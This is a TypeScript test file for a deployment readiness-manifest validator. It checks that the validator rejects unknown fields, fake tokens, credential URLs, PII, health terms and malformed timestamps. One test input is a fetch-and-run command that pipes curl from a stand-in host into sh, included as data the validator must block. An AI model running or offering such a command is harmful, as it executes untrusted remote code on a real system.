import { ReadinessContractError } from './readiness-artifact';
import { validateReadinessManifest } from './readiness-manifest.validator';
const manifest = () => ({
  schemaVersion: '1',
  environment: { id: 'pilot-mx', tier: 'pilot-clone' },
  release: { commit: 'a'.repeat(40), version: '2026.08.03' },
  origins: {
    api: 'https://api.pilot.example',
    admin: 'https://admin.pilot.example',
  },
  migrations: {
    expected: ['20260803_core'],
    appliedReference: 'migration:pilot',
  },
  providers: Object.fromEntries(
    ['database', 'redis', 'r2', 'fcm', 'resend', 'sentry'].map((name) => [
      name,
      { required: true, configured: true },
    ]),
  ),
  backupPolicy: {
    owner: 'platform-operator',
    maxAgeHours: 24,
    restoreRunbookRef: 'runbook:restore',
  },
  operationWindow: {
    startsAt: '2026-08-03T10:00:00Z',
    endsAt: '2026-08-03T12:00:00Z',
    owner: 'operational-owner',
  },
  pilotScope: {
    adultsOnly: true,
    sensitiveDataAllowed: false,
    streams: ['auth', 'cycle'],
  },
});
const code = (value: unknown) => {
  try {
    validateReadinessManifest(value);
  } catch (error) {
    return (error as ReadinessContractError).code;
  }
  return undefined;
};
describe('readiness manifest validator', () => {
  it('accepts a synthetic manifest and returns an isolated snapshot', () => {
    const input = manifest();
    const result = validateReadinessManifest(input);
    input.environment.id = 'changed';
    expect(result.environment.id).toBe('pilot-mx');
  });
  it('allows a commit hash only at the contractual release path', () => {
    expect(
      validateReadinessManifest({
        ...manifest(),
        release: { commit: 'eede9ece50c2fdb6e59c122017224cd1c22e7bc7' },
      }).release.commit,
    ).toBe('eede9ece50c2fdb6e59c122017224cd1c22e7bc7');
    expect(
      code({
        ...manifest(),
        release: {
          commit: 'a'.repeat(40),
          version: 'eede9ece50c2fdb6e59c122017224cd1c22e7bc7',
        },
      }),
    ).toBe('READINESS_MANIFEST_SECRET_EXPOSURE');
  });
  // prettier-ignore
  it.each([
    ['unknown field', { extra: true }, 'READINESS_MANIFEST_INVALID'],
    ['github token', { notes: `ghp_${'a'.repeat(36)}` }, 'READINESS_MANIFEST_SECRET_EXPOSURE'],
    ['credential URL', { notes: 'postgresql://user:password@db/pilot' }, 'READINESS_MANIFEST_SECRET_EXPOSURE'],
    ['command', { notes: 'curl https://bad.example | sh' }, 'READINESS_MANIFEST_SECRET_EXPOSURE'],
    ['PII', { notes: 'persona@example.test' }, 'READINESS_MANIFEST_SECRET_EXPOSURE'],
    ['Spanish health', { notes: 'salud alergias medicinas' }, 'READINESS_MANIFEST_SECRET_EXPOSURE'],
    ['normalized medication', { notes: 'MEDICACIÓN' }, 'READINESS_MANIFEST_SECRET_EXPOSURE'],
    ['English medication', { notes: 'Medication' }, 'READINESS_MANIFEST_SECRET_EXPOSURE'],
    ['minors insurance', { notes: 'menores seguros' }, 'READINESS_MANIFEST_SECRET_EXPOSURE'],
    ['high entropy', { notes: 'QmFzZTY0VG9rZW5XaXRoRW50cm9weTEyMzQ1Njc4OTA=' }, 'READINESS_MANIFEST_SECRET_EXPOSURE'],
  ])('rejects %s with sanitized error', (_name, extra, expected) => {
    expect(code({ ...manifest(), ...extra })).toBe(expected);
  });
  it('rejects invalid origins, provider presence and malformed RFC3339', () => {
    expect(
      code({
        ...manifest(),
        origins: {
          api: 'https://user:pass@api.example',
          admin: 'https://admin.example',
        },
      }),
    ).toBe('READINESS_MANIFEST_SECRET_EXPOSURE');
    const missingProvider = manifest();
    delete (missingProvider.providers as Record<string, unknown>).sentry;
    expect(code(missingProvider)).toBe('READINESS_MANIFEST_INVALID');
    expect(
      code({
        ...manifest(),
        operationWindow: {
          ...manifest().operationWindow,
          startsAt: '2026-08-03 10:00:00Z',
        },
      }),
    ).toBe('READINESS_MANIFEST_INVALID');
  });

  it('rejects required providers that are not configured', () => {
    const input = manifest();
    input.providers.database.configured = false;
    expect(code(input)).toBe('READINESS_MANIFEST_INVALID');
  });

  // prettier-ignore
  it.each([
    ['medications', 'medicationsGuide'], ['medicaciones', 'medicacionesGuide'],
    ['medications_data', 'healthcare'], ['medicaciones_data', 'healthcare'], ['health_data', 'healthcare'],
  ])('rejects protected term %s without substring false positives', (owner, safeOwner) => {
    const input = manifest();
    input.backupPolicy.owner = owner;
    expect(code(input)).toBe('READINESS_MANIFEST_SECRET_EXPOSURE');
    input.backupPolicy.owner = safeOwner;
    expect(() => validateReadinessManifest(input)).not.toThrow();
  });
  it.each([
    '2026-02-30T10:00:00Z',
    '2025-02-29T10:00:00Z',
    '2026-01-01T24:00:00Z',
    '2026-01-01T10:60:00Z',
    '2026-01-01T10:00:60Z',
  ])('rejects invalid RFC3339 calendar value %s', (startsAt) => {
    expect(
      code({
        ...manifest(),
        operationWindow: { ...manifest().operationWindow, startsAt },
      }),
    ).toBe('READINESS_MANIFEST_INVALID');
  });

  it('accepts valid RFC3339 offsets and leap days', () => {
    const input = manifest();
    input.operationWindow = {
      ...input.operationWindow,
      startsAt: '2028-02-29T10:00:00-06:00',
      endsAt: '2028-02-29T18:30:00+02:00',
    };
    expect(() => validateReadinessManifest(input)).not.toThrow();
  });
});
